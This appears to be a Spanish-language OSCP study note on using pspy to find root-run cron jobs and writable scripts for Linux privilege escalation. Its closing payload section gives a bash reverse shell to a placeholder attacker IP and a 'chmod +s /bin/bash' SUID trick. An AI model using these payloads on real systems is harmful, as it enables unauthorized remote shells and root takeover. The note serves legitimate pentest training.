# 🛠️ Uso de `pspy` para Enumeración y Escalada de Privilegios 

## 📌 ¿Qué es `pspy`?

`pspy` es una herramienta que permite observar procesos en sistemas Linux sin necesidad de privilegios de root. Es útil para detectar **scripts automatizados, cron jobs** y otros procesos que pueden ser explotados para escalar privilegios.

- 📦 Repositorio: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

---

## ✅ ¿Por qué es útil ?

- No requiere root.
- Detecta procesos en tiempo real.
- Ideal para encontrar **cron jobs mal configurados**, ejecución de scripts como root, archivos temporales modificables, etc.
- Ayuda a detectar rutas de escalada locales poco evidentes.

---

## 📥 Descarga

Descargar desde GitHub la versión adecuada para la arquitectura:

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
```

> También hay versión de 32 bits (`pspy32`) si estás en una máquina x86.

---

## 🚀 Ejecución Básica

```bash
./pspy64
```

- Muestra todos los procesos que se están ejecutando en el sistema.
- No requiere permisos especiales.

---

## 🔍 ¿Qué debo buscar?

### 🕑 Tareas programadas (cron jobs)
- Buscar comandos ejecutados cada minuto o cada cierto tiempo.
- Ver si esos scripts son **propiedad de root pero modificables por el usuario actual**.

### 🧩 Scripts ejecutados automáticamente
- Archivos `.sh`, `.py`, `.pl` lanzados automáticamente.
- Comprobar si están ubicados en rutas accesibles: `/tmp`, `/home/user/`, etc.

### 📝 Escritura en rutas
- Verifica si los scripts tienen permisos de escritura:
  
  ```bash
  ls -l /ruta/al/script.sh
  ```

- Si puedes escribir en ellos y los ejecuta root, podrías insertar un payload.

### 🔐 Binaris con PATH mal configurado
- Algunos scripts pueden ejecutar binarios sin ruta absoluta (ej. `cp`, `tar`, etc.).
- Si puedes modificar el PATH, puedes hacer que se ejecute tu binario malicioso.

---

## 📚 Ejemplo Real

```bash
2025/04/22 12:00:01 CMD: UID=0    PID=1234   | /bin/sh /usr/local/bin/backup.sh
```

Luego:
```bash
ls -la /usr/local/bin/backup.sh
# -rwxrwxr-x 1 root user 234 Apr 22 12:00 /usr/local/bin/backup.sh
```

✔️ Si puedes modificar `backup.sh`, puedes añadir reverse shell, cambiar permisos, etc.

---

## 💡 Tips para OSCP

- Ejecuta `pspy` inmediatamente después de obtener una shell.
- Déjalo corriendo mientras haces otras tareas. Observa comportamientos extraños.
- Combínalo con `linpeas`, `ps -ef`, y `find` para descubrir vectores.
- Apóyate en técnicas como:
  - **PATH hijacking**
  - **cronjob exploitation**
  - **SUID abuse combinado con procesos observados**

---

## 🔐 Payloads comunes para scripts

### Reverse shell en bash:
```bash
bash -i >& /dev/tcp/TU_IP/PUERTO 0>&1
```

### Escalada con chmod:
```bash
chmod +s /bin/bash
```

---

## 🧠 Cosas a recordar para el examen

- Lleva `pspy` listo en tu máquina atacante.
- Usa `scp`, `nc`, o `python -m http.server` para transferirlo.
- Ten preparado un **script de enumeración automática** que lo ejecute tras conseguir acceso.